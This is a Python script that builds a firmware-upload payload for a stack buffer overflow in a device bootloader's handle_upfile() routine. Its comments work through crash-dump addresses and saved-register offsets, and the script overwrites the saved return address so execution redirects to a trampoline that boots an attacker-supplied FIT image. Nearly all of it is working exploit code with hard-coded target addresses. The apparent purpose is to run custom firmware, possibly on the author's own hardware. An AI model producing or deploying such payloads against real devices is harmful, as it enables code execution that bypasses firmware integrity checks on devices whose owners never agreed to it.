#!/usr/bin/env python3
"""
Builds a RAM-boot exploit payload that never overlays the APPSBL at all.
Instead, it hijacks handle_upfile()'s own saved return address on the
stack - reachable and reached *before* the .text self-modifying-code
danger zone the overlay approach crashes in (see the appsbl project's
CLEAN_ROOM_STATUS.md) - and redirects straight into a tiny trampoline
that calls the vendor's own, unmodified run_command("bootm ...").

Numbers below are derived from disassembling the reference APPSBL build
(byte-identical to the real device's firmware) - see arm-selfmod-lab's
README and the appsbl project's CLEAN_ROOM_STATUS.md for the derivation.
"""
import argparse
import struct

UPLOAD_ADDR = 0x44000000
HDR_LEN_SIZE = 4
HDR_MD5_SIZE = 16
HDR_PRODUCT_SIZE = 0x1000
HDR_TOTAL = HDR_LEN_SIZE + HDR_MD5_SIZE + HDR_PRODUCT_SIZE  # 0x1014

TRAMPOLINE_ADDR = UPLOAD_ADDR + HDR_LEN_SIZE + HDR_MD5_SIZE  # 0x44000014

# Real crash dump: sp=0x4a822860, captured inside memcpy(), which itself
# does `push {r4,r5,lr}` at entry - so this sp is memcpy's *own* post-push
# value. memcpy's saved-lr therefore lives at sp+8 (r4@+0, r5@+4, lr@+8).
# handle_upfile()'s own frame is one level up: its entry sp = this sp + 12
# (memcpy's push), and it does `push {r4,r5,r6,r7,r8,lr}`, so its saved-lr
# lives at (sp+12)+20 = sp+32.
#
# First attempt targeted only handle_upfile's slot and crashed identically
# to the un-fixed overlay approach (same pc/lr) despite a payload smaller
# than the .text danger-zone threshold - proof the real hazard triggers
# here, not there. Root cause: a single memcpy() call (~1 TCP segment,
# >>24 bytes) sweeps through *both* slots at once, since they're only 24
# bytes apart. The 0xFF filler in between clobbered memcpy's own saved-lr
# first, so memcpy crashed returning into garbage before handle_upfile's
# epilogue - carrying our crafted value - was ever reached.
#
# Fix: preserve memcpy's own saved-lr (0x4a97f6af, its unmodified return
# address into handle_upfile) explicitly, and place our redirect only at
# handle_upfile's slot, 24 bytes later.
MEMCPY_OWN_LR_ADDR = 0x4a822860 + 8
MEMCPY_OWN_LR_VALUE = 0x4a97f6af
TARGET_STACK_ADDR = 0x4a822860 + 12 + 20
TARGET_UPFILE_COUNT = TARGET_STACK_ADDR - UPLOAD_ADDR
MEMCPY_OWN_LR_UPFILE_COUNT = MEMCPY_OWN_LR_ADDR - UPLOAD_ADDR

MARGIN_AFTER = 64 * 1024  # keep the target well clear of the final packet


def build(trampoline_path: str, fit_path: str, out_path: str) -> None:
    with open(trampoline_path, "rb") as f:
        trampoline = f.read()
    with open(fit_path, "rb") as f:
        fit = f.read()

    if HDR_TOTAL + len(fit) > TARGET_UPFILE_COUNT:
        raise SystemExit(
            f"FIT ({len(fit)} bytes) does not fit before the redirect "
            f"target (0x{TARGET_UPFILE_COUNT:x}) - shrink the FIT or this "
            f"whole approach needs a different target address"
        )
    if len(trampoline) > HDR_PRODUCT_SIZE:
        raise SystemExit("trampoline larger than the product field")

    total_size = TARGET_UPFILE_COUNT + 4 + MARGIN_AFTER
    buf = bytearray(b"\xff" * total_size)

    # Zone A: header. filesize/MD5 are irrelevant here - this path never
    # reaches handle_fw_cloud()/nm_upgradeFirmware() at all - but keep
    # them zeroed for hygiene rather than leaving stray 0xFF bytes.
    buf[0:HDR_LEN_SIZE] = b"\x00" * HDR_LEN_SIZE
    buf[HDR_LEN_SIZE:HDR_LEN_SIZE + HDR_MD5_SIZE] = b"\x00" * HDR_MD5_SIZE
    # Trampoline lands at the very start of the (otherwise unused) product
    # field, i.e. exactly at UPLOAD_ADDR + 0x14 = TRAMPOLINE_ADDR.
    buf[HDR_LEN_SIZE + HDR_MD5_SIZE:HDR_LEN_SIZE + HDR_MD5_SIZE + len(trampoline)] = trampoline

    # Zone B: FIT, at the fixed offset the trampoline's "bootm 0x44001014"
    # string points at (UPLOAD_ADDR + HDR_TOTAL).
    buf[HDR_TOTAL:HDR_TOTAL + len(fit)] = fit

    # Zone C: preserve memcpy()'s own saved-lr 24 bytes earlier, so it
    # returns normally into handle_upfile() instead of crashing first.
    buf[MEMCPY_OWN_LR_UPFILE_COUNT:MEMCPY_OWN_LR_UPFILE_COUNT + 4] = struct.pack("<I", MEMCPY_OWN_LR_VALUE)

    # Zone D: the actual payload - 4 bytes, the trampoline's address,
    # landing exactly on handle_upfile()'s saved lr while its own call
    # frame is live.
    buf[TARGET_UPFILE_COUNT:TARGET_UPFILE_COUNT + 4] = struct.pack("<I", TRAMPOLINE_ADDR)

    with open(out_path, "wb") as f:
        f.write(buf)

    print(f"Trampoline address:      0x{TRAMPOLINE_ADDR:08x} ({len(trampoline)} bytes)")
    print(f"FIT zone:                0x{HDR_TOTAL:08x}..0x{HDR_TOTAL + len(fit):08x} ({len(fit)} bytes)")
    print(f"memcpy's own saved-lr:   0x{MEMCPY_OWN_LR_ADDR:08x}  (file offset 0x{MEMCPY_OWN_LR_UPFILE_COUNT:x}) preserved as 0x{MEMCPY_OWN_LR_VALUE:08x}")
    print(f"Redirect target (stack): 0x{TARGET_STACK_ADDR:08x}  (file offset 0x{TARGET_UPFILE_COUNT:x}, {TARGET_UPFILE_COUNT / 1048576:.2f} MiB)")
    print(f"Total payload size:      {total_size} bytes ({total_size / 1048576:.2f} MiB)")
    print(f"Wrote: {out_path}")


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--trampoline", required=True)
    ap.add_argument("--fit", required=True)
    ap.add_argument("-o", "--output", required=True)
    args = ap.parse_args()
    build(args.trampoline, args.fit, args.output)
